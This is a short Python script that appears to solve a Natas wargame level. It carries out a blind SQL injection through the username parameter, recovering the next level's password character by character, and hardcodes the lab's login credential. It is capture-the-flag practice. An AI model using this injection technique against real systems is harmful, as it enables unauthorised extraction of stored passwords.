import requests
from requests.auth import HTTPBasicAuth
from requests_toolbelt.utils import dump
URL = "http://natas15.natas.labs.overthewire.org/index.php"
charString = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
strA = 'natas16" AND password LIKE BINARY"'
key = ""
#I read up on this online and had we used a percentage sign on both sides for the first time to filter out 32 characters, code would have been much faster...
while(len(key)<32):
    for a in charString:
        tryKey = key + a
        PARAMS = {'username':strA + tryKey + "%"}
        r = requests.get(url = URL, auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), params = PARAMS)
        data = dump.dump_all(r)
        if "exists" in data.decode('utf-8'):
            key = tryKey
            print(key)
            break








